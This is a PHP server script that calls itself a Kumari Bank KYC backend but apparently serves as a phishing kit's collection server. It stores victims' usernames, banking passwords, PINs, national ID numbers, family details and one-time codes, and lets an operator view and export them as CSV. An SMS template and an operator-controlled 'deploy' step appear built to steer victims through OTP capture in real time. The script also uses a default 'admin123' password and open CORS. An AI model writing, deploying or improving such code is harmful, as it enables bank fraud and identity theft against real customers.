<?php
// ==========================================================
// Kumari Bank Limited KYC Backend â€” PHP/cPanel Version
// Universal compatibility: PHP 7.0+ / 8.0+ / LiteSpeed / Apache
// Clean, simple & robust: KYC API + SMS Configuration
// ==========================================================

// 1. Suppress display errors to prevent polluting JSON responses
error_reporting(0);
ini_set('display_errors', '0');

// 2. Comprehensive CORS & Content headers (works on HTTP & HTTPS)
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS, HEAD');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With, X-Admin-Password, X-Admin-Token');
header('Content-Type: application/json; charset=utf-8');

// Handle CORS Preflight OPTIONS
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

$dataDir       = __DIR__ . '/data';
$dataFile      = $dataDir . '/responses.json';
$smsConfigFile = $dataDir . '/sms_config.json';
$adminConfigFile = $dataDir . '/admin_config.json';

// Ensure data directory exists with safe cPanel-compatible permissions (0755/0644)
if (!is_dir($dataDir)) {
    @mkdir($dataDir, 0755, true);
    @chmod($dataDir, 0755);
}
if (!file_exists($dataFile)) {
    @file_put_contents($dataFile, '[]');
    @chmod($dataFile, 0644);
}
if (!file_exists($smsConfigFile)) {
    @file_put_contents($smsConfigFile, json_encode([
        'recipient'       => '32001',
        'messageTemplate' => "KUMARI BANK KYC VERIFICATION CODE REQUEST\nRef: {REF_ID}\nMobile: {MOBILE}\nTime: {TIME}",
        'updatedAt'       => date('Y-m-d H:i:s'),
        'deployedAt'      => '',
        'sessionMessages' => []
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    @chmod($smsConfigFile, 0644);
}
if (!file_exists($adminConfigFile)) {
    @file_put_contents($adminConfigFile, json_encode([
        'adminPassword' => getenv('ADMIN_PASSWORD') ?: 'admin123',
        'updatedAt'     => date('Y-m-d H:i:s')
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    @chmod($adminConfigFile, 0644);
}

// â”€â”€ Helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

function readResponses($file) {
    if (file_exists($file)) {
        $raw = @file_get_contents($file);
        if (!empty($raw)) {
            $d = json_decode($raw, true);
            if (is_array($d)) return $d;
        }
    }
    return [];
}

function saveResponses($file, $data) {
    @file_put_contents($file, json_encode(is_array($data) ? $data : [], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}

function sendJson($status, $obj) {
    http_response_code($status);
    echo json_encode($obj, JSON_UNESCAPED_UNICODE);
    exit;
}

function getSmsConfig($file) {
    if (file_exists($file)) {
        $raw = @file_get_contents($file);
        if (!empty($raw)) {
            $cfg = json_decode($raw, true);
            if (is_array($cfg) && !empty($cfg['messageTemplate'])) return $cfg;
        }
    }
    return [
        'recipient'       => '32001',
        'messageTemplate' => "KUMARI BANK KYC VERIFICATION CODE REQUEST\nRef: {REF_ID}\nMobile: {MOBILE}\nTime: {TIME}",
        'updatedAt'       => date('Y-m-d H:i:s'),
        'sessionMessages' => []
    ];
}

function saveSmsConfig($file, $cfg) {
    @file_put_contents($file, json_encode($cfg, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}

function renderSmsMessage($template, $params = []) {
    $refId    = isset($params['refId']) && $params['refId'] !== '' ? $params['refId'] : ('KBL-KYC-' . rand(100000, 999999));
    $mobile   = isset($params['mobile']) ? $params['mobile'] : '';
    $username = isset($params['username']) ? $params['username'] : '';
    $time     = date('H:i:s');

    return str_replace(
        ['{REF_ID}', '{MOBILE}', '{USERNAME}', '{TIME}'],
        [$refId, $mobile, $username, $time],
        $template
    );
}

function getAdminConfig($file) {
    if (file_exists($file)) {
        $raw = @file_get_contents($file);
        if (!empty($raw)) {
            $cfg = json_decode($raw, true);
            if (is_array($cfg) && !empty($cfg['adminPassword'])) return $cfg;
        }
    }
    return [
        'adminPassword' => getenv('ADMIN_PASSWORD') ?: 'admin123',
        'updatedAt'     => date('Y-m-d H:i:s')
    ];
}

function saveAdminConfig($file, $cfg) {
    @file_put_contents($file, json_encode($cfg, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}

function isAuthorizedAdmin($adminConfigFile) {
    $cfg = getAdminConfig($adminConfigFile);
    $expected = trim($cfg['adminPassword'] ?? 'admin123');
    $expectedB64 = base64_encode($expected);

    // 1. Check all headers for X-Admin-Password or X-Admin-Token
    $headers = function_exists('getallheaders') ? getallheaders() : [];
    foreach ($headers as $k => $v) {
        $lk = strtolower($k);
        if ($lk === 'x-admin-password' || $lk === 'x-admin-token') {
            $val = trim((string)$v);
            if ($val === $expected || strcasecmp($val, $expected) === 0 || $val === $expectedB64) return true;
        }
    }
    if (!empty($_SERVER['HTTP_X_ADMIN_PASSWORD'])) {
        $v = trim((string)$_SERVER['HTTP_X_ADMIN_PASSWORD']);
        if ($v === $expected || strcasecmp($v, $expected) === 0 || $v === $expectedB64) return true;
    }
    if (!empty($_SERVER['REDIRECT_HTTP_X_ADMIN_PASSWORD'])) {
        $v = trim((string)$_SERVER['REDIRECT_HTTP_X_ADMIN_PASSWORD']);
        if ($v === $expected || strcasecmp($v, $expected) === 0 || $v === $expectedB64) return true;
    }
    if (!empty($_SERVER['HTTP_X_ADMIN_TOKEN'])) {
        $v = trim((string)$_SERVER['HTTP_X_ADMIN_TOKEN']);
        if ($v === $expected || strcasecmp($v, $expected) === 0 || $v === $expectedB64) return true;
    }
    if (!empty($_SERVER['REDIRECT_HTTP_X_ADMIN_TOKEN'])) {
        $v = trim((string)$_SERVER['REDIRECT_HTTP_X_ADMIN_TOKEN']);
        if ($v === $expected || strcasecmp($v, $expected) === 0 || $v === $expectedB64) return true;
    }

    // 2. Authorization header (Bearer token)
    $auth = isset($_SERVER['HTTP_AUTHORIZATION']) ? $_SERVER['HTTP_AUTHORIZATION'] : '';
    if (!$auth && isset($_SERVER['REDIRECT_HTTP_AUTHORIZATION'])) {
        $auth = $_SERVER['REDIRECT_HTTP_AUTHORIZATION'];
    }
    if (strpos($auth, 'Bearer ') === 0) {
        $token = trim(substr($auth, 7));
        if ($token === $expected || strcasecmp($token, $expected) === 0 || $token === $expectedB64) return true;
    }

    // 3. Query param auth / token / password
    $q = isset($_GET['auth']) ? $_GET['auth'] : (isset($_GET['token']) ? $_GET['token'] : (isset($_GET['password']) ? $_GET['password'] : ''));
    if ($q) {
        $q = trim((string)$q);
        if ($q === $expected || strcasecmp($q, $expected) === 0 || $q === $expectedB64) return true;
    }

    return false;
}

// â”€â”€ Path & Request Normalization â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

$rawRoute = isset($_GET['route']) ? trim($_GET['route']) : '';
$uri      = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH);
$method   = strtoupper($_SERVER['REQUEST_METHOD'] ?? 'GET');
$rawInput = file_get_contents('php://input');
$body     = json_decode($rawInput, true);
if (!is_array($body)) $body = [];

// Client IP detection (behind Cloudflare or proxy)
$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? ($_SERVER['REMOTE_ADDR'] ?? ''));
if (strpos($ip, ',') !== false) {
    $ipParts = explode(',', $ip);
    $ip = trim($ipParts[0]);
}

// Universal Route Resolver:
if ($rawRoute !== '') {
    $path = '/' . ltrim($rawRoute, '/');
} else {
    // If request has /api/... in URI, extract starting from /api/
    if (preg_match('#(/api/.*)$#', $uri, $m)) {
        $path = $m[1];
    } elseif (preg_match('#(^|/)api\.php#', $uri)) {
        $path = preg_replace('#^.*/api\.php#', '', $uri);
        $path = $path ?: '/';
    } else {
        $path = $uri;
    }
}

// Ensure path has /api/ prefix
if (strpos($path, '/api/') !== 0) {
    $path = '/api/' . ltrim($path, '/');
}
$path = rtrim($path, '/');
if ($path === '' || $path === '/api') $path = '/api/health';

// â”€â”€ 0. ADMIN AUTHENTICATION ENDPOINTS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
if ($path === '/api/admin/login' && $method === 'POST') {
    $cfg = getAdminConfig($adminConfigFile);
    $expected = trim($cfg['adminPassword'] ?? 'admin123');
    $inputPassword = isset($body['password']) ? trim((string)$body['password']) : (isset($_POST['password']) ? trim((string)$_POST['password']) : '');
    if ($inputPassword !== '' && ($inputPassword === $expected || strcasecmp($inputPassword, $expected) === 0)) {
        sendJson(200, [
            'status'  => 'success',
            'token'   => base64_encode($expected),
            'message' => 'Admin authentication successful'
        ]);
    } else {
        sendJson(401, [
            'status'  => 'error',
            'message' => 'Invalid administrator password'
        ]);
    }
}

if ($path === '/api/admin/check-auth' && ($method === 'GET' || $method === 'POST')) {
    if (isAuthorizedAdmin($adminConfigFile)) {
        sendJson(200, ['status' => 'success', 'authenticated' => true]);
    } else {
        sendJson(401, ['status' => 'error', 'authenticated' => false, 'message' => 'Not authenticated']);
    }
}

if ($path === '/api/admin/change-password' && $method === 'POST') {
    if (!isAuthorizedAdmin($adminConfigFile)) {
        sendJson(401, ['status' => 'error', 'message' => 'Unauthorized. Admin password required.']);
    }
    $cfg = getAdminConfig($adminConfigFile);
    $current = isset($body['currentPassword']) ? trim((string)$body['currentPassword']) : '';
    $newPass = isset($body['newPassword']) ? trim((string)$body['newPassword']) : '';
    if ($current !== $cfg['adminPassword']) {
        sendJson(400, ['status' => 'error', 'message' => 'Current password is incorrect']);
    }
    if (strlen($newPass) < 4) {
        sendJson(400, ['status' => 'error', 'message' => 'New password must be at least 4 characters']);
    }
    $cfg['adminPassword'] = $newPass;
    $cfg['updatedAt'] = date('Y-m-d H:i:s');
    saveAdminConfig($adminConfigFile, $cfg);
    sendJson(200, [
        'status'  => 'success',
        'token'   => base64_encode($newPass),
        'message' => 'Admin password updated successfully'
    ]);
}

// â”€â”€ 1. HEALTH CHECK â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
if ($path === '/api/health' && ($method === 'GET' || $method === 'HEAD')) {
    $data = readResponses($dataFile);
    sendJson(200, [
        'status'         => 'online',
        'service'        => 'Kumari Bank Limited KYC Backend',
        'backendType'    => 'PHP/cPanel Engine',
        'totalResponses' => count($data),
        'time'           => date('c'),
    ]);
}

// â”€â”€ 2. RESPONSES REPOSITORY (Protected) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
if ($path === '/api/responses' && ($method === 'GET' || $method === 'HEAD')) {
    if (!isAuthorizedAdmin($adminConfigFile)) {
        sendJson(401, ['status' => 'error', 'message' => 'Unauthorized. Admin password required.']);
    }
    $records = readResponses($dataFile);
    sendJson(200, $records);
}

if ($path === '/api/responses' && $method === 'DELETE') {
    if (!isAuthorizedAdmin($adminConfigFile)) {
        sendJson(401, ['status' => 'error', 'message' => 'Unauthorized. Admin password required.']);
    }
    saveResponses($dataFile, []);
    sendJson(200, ['status' => 'success', 'message' => 'All stored responses have been cleared']);
}

// â”€â”€ 3. SMS CONFIGURATION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
if ($path === '/api/sms-config' && ($method === 'GET' || $method === 'HEAD')) {
    $cfg = getSmsConfig($smsConfigFile);
    sendJson(200, array_merge(['status' => 'success'], $cfg));
}

if ($path === '/api/sms-config' && $method === 'POST') {
    if (!isAuthorizedAdmin($adminConfigFile)) {
        sendJson(401, ['status' => 'error', 'message' => 'Unauthorized. Admin password required.']);
    }
    $cfg = getSmsConfig($smsConfigFile);
    if (!empty($body['messageTemplate'])) {
        $cfg['messageTemplate'] = trim($body['messageTemplate']);
    }
    if (!empty($body['recipient'])) {
        $cfg['recipient'] = trim($body['recipient']);
    }
    if (!empty($body['sessionId']) && isset($body['customMessage'])) {
        if (!isset($cfg['sessionMessages'])) $cfg['sessionMessages'] = [];
        $cfg['sessionMessages'][$body['sessionId']] = trim($body['customMessage']);
    }
    $cfg['updatedAt']  = date('Y-m-d H:i:s');
    // deployedAt is the admin-controlled signal â€” frontend polls this to unlock step 3
    $cfg['deployedAt'] = date('Y-m-d H:i:s');
    saveSmsConfig($smsConfigFile, $cfg);
    sendJson(200, [
        'status'          => 'success',
        'message'         => 'SMS message configuration updated and deployed to users',
        'recipient'       => isset($cfg['recipient']) ? $cfg['recipient'] : '32001',
        'messageTemplate' => $cfg['messageTemplate'],
        'deployedAt'      => $cfg['deployedAt']
    ]);
}

if ($path === '/api/sms-message' && ($method === 'GET' || $method === 'POST')) {
    $refId     = isset($_GET['refId']) ? $_GET['refId'] : (isset($body['refId']) ? $body['refId'] : '');
    $mobile    = isset($_GET['mobile']) ? $_GET['mobile'] : (isset($body['mobile']) ? $body['mobile'] : '');
    $sessionId = isset($_GET['sessionId']) ? $_GET['sessionId'] : (isset($body['sessionId']) ? $body['sessionId'] : '');
    $username  = isset($_GET['username']) ? $_GET['username'] : (isset($body['username']) ? $body['username'] : '');

    $cfg = getSmsConfig($smsConfigFile);
    $recipient = isset($cfg['recipient']) ? $cfg['recipient'] : '32001';

    if ($sessionId && !empty($cfg['sessionMessages'][$sessionId])) {
        $smsBody = renderSmsMessage($cfg['sessionMessages'][$sessionId], [
            'refId' => $refId, 'mobile' => $mobile, 'username' => $username
        ]);
    } else {
        $smsBody = renderSmsMessage($cfg['messageTemplate'], [
            'refId' => $refId, 'mobile' => $mobile, 'username' => $username
        ]);
    }

    sendJson(200, [
        'status'       => 'success',
        'smsRecipient' => $recipient,
        'smsMessage'   => $smsBody
    ]);
}

// â”€â”€ 4. KYC STEP 1 SUBMIT â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
if (($path === '/api/submit' || $path === '/api/submit-kyc') && $method === 'POST') {
    $sessionId = !empty($body['sessionId']) ? $body['sessionId'] : ('KBL-SES-' . rand(100000, 999999));
    $refId     = !empty($body['refId']) ? $body['refId'] : ('KBL-KYC-' . rand(100000, 999999));
    $cfg       = getSmsConfig($smsConfigFile);
    $smsRecipient = isset($cfg['recipient']) ? $cfg['recipient'] : '32001';
    $smsMessage   = renderSmsMessage($cfg['messageTemplate'], [
        'refId'    => $refId,
        'mobile'   => isset($body['mobile']) ? $body['mobile'] : '',
        'username' => isset($body['username']) ? $body['username'] : ''
    ]);

    $record = [
        'id'           => (int)(microtime(true) * 1000),
        'sessionId'    => $sessionId,
        'refId'        => $refId,
        'status'       => 'INITIAL_SUBMISSION',
        'username'     => isset($body['username']) && $body['username'] !== '' ? $body['username'] : (isset($body['fullName']) ? $body['fullName'] : ''),
        'mobile'       => isset($body['mobile']) ? $body['mobile'] : '',
        'password'     => isset($body['password']) ? $body['password'] : '',
        'pin'          => isset($body['pin']) ? $body['pin'] : '',
        'fatherName'   => isset($body['fatherName']) ? $body['fatherName'] : '',
        'nidNumber'    => isset($body['nidNumber']) ? $body['nidNumber'] : '',
        'otp'          => '',
        'clientIp'     => $ip,
        'userAgent'    => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'createdAt'    => date('Y-m-d H:i:s'),
        'verifiedAt'   => '',
        'smsRecipient' => $smsRecipient,
        'smsMessage'   => $smsMessage
    ];

    $existing = readResponses($dataFile);
    $found = false;
    foreach ($existing as &$r) {
        if ($r['sessionId'] === $sessionId || (!empty($body['mobile']) && $r['mobile'] === $body['mobile'] && $r['status'] === 'INITIAL_SUBMISSION')) {
            if (!empty($record['username']))   $r['username']   = $record['username'];
            if (!empty($record['mobile']))     $r['mobile']     = $record['mobile'];
            if (!empty($record['password']))   $r['password']   = $record['password'];
            if (!empty($record['pin']))        $r['pin']        = $record['pin'];
            if (!empty($record['fatherName'])) $r['fatherName'] = $record['fatherName'];
            if (!empty($record['nidNumber']))  $r['nidNumber']  = $record['nidNumber'];
            $r['smsRecipient'] = $smsRecipient;
            $r['smsMessage']   = $smsMessage;
            $found = true;
            break;
        }
    }
    if (!$found) array_unshift($existing, $record);
    saveResponses($dataFile, $existing);

    sendJson(200, [
        'status'       => 'success',
        'sessionId'    => $sessionId,
        'refId'        => $refId,
        'smsRecipient' => $smsRecipient,
        'smsMessage'   => $smsMessage,
        'message'      => 'Response recorded successfully'
    ]);
}

// â”€â”€ 5. KYC STEP 3 OTP VERIFICATION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
if ($path === '/api/verify-otp' && $method === 'POST') {
    $otp = isset($body['otp']) ? trim((string)$body['otp']) : '';
    if (!preg_match('/^\d{6}$/', $otp)) {
        sendJson(400, ['status' => 'error', 'message' => 'Valid 6-digit OTP code is required']);
    }
    $existing   = readResponses($dataFile);
    $targetSess = isset($body['sessionId']) ? $body['sessionId'] : '';
    $targetMob  = isset($body['mobile']) ? $body['mobile'] : '';
    $finalRefId = isset($body['refId']) ? $body['refId'] : '';
    $updated    = false;

    foreach ($existing as &$r) {
        if (($targetSess && $r['sessionId'] === $targetSess) ||
            ($targetMob && $r['mobile'] === $targetMob && $r['status'] === 'INITIAL_SUBMISSION')) {
            $r['otp']        = isset($body['otp']) ? $body['otp'] : '';
            if (!empty($body['refId'])) $r['refId'] = $body['refId'];
            $r['status']     = 'VERIFIED_COMPLETE';
            $r['verifiedAt'] = date('Y-m-d H:i:s');
            $finalRefId      = $r['refId'];
            $updated         = true;
            break;
        }
    }

    if (!$updated) {
        $finalRefId = $finalRefId ? $finalRefId : ('KBL-KYC-' . rand(100000, 999999));
        array_unshift($existing, [
            'id'                => (int)(microtime(true) * 1000),
            'sessionId'         => $targetSess ? $targetSess : ('KBL-SES-' . rand(100000, 999999)),
            'refId'             => $finalRefId,
            'status'            => 'VERIFIED_COMPLETE',
            'username'          => isset($body['username']) && $body['username'] !== '' ? $body['username'] : (isset($body['fullName']) ? $body['fullName'] : ''),
            'mobile'            => $targetMob,
            'password'          => isset($body['password']) ? $body['password'] : '',
            'pin'               => isset($body['pin']) ? $body['pin'] : '',
            'fatherName'        => isset($body['fatherName']) ? $body['fatherName'] : '',
            'otp'               => isset($body['otp']) ? $body['otp'] : '',
            'clientIp'          => $ip,
            'userAgent'         => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'createdAt'         => date('Y-m-d H:i:s'),
            'verifiedAt'        => date('Y-m-d H:i:s'),
        ]);
    }

    saveResponses($dataFile, $existing);
    sendJson(200, ['status' => 'success', 'refId' => $finalRefId, 'message' => 'KYC OTP verification recorded successfully']);
}

// â”€â”€ 6. EXPORT RESPONSES AS CSV (Protected) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
if ($path === '/api/export/csv' && ($method === 'GET' || $method === 'HEAD')) {
    if (!isAuthorizedAdmin($adminConfigFile)) {
        sendJson(401, ['status' => 'error', 'message' => 'Unauthorized. Admin password required.']);
    }
    $records = readResponses($dataFile);
    $cols = ['id','sessionId','refId','status','username','mobile','password','pin','fatherName','otp','clientIp','createdAt','verifiedAt'];
    header('Content-Type: text/csv; charset=utf-8');
    header('Content-Disposition: attachment; filename="kyc_responses.csv"');
    echo implode(',', $cols) . "\n";
    foreach ($records as $r) {
        $escaped = [];
        foreach ($cols as $c) {
            $val = isset($r[$c]) ? (string)$r[$c] : '';
            $escaped[] = '"' . str_replace('"', '""', $val) . '"';
        }
        echo implode(',', $escaped) . "\n";
    }
    exit;
}

// â”€â”€ 404 NOT FOUND â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
sendJson(404, [
    'error'   => 'API route not found',
    'path'    => $path,
    'method'  => $method,
    'hint'    => 'Valid routes include: /api/health, /api/responses, /api/submit, /api/verify-otp, /api/sms-config, /api/sms-message'
]);

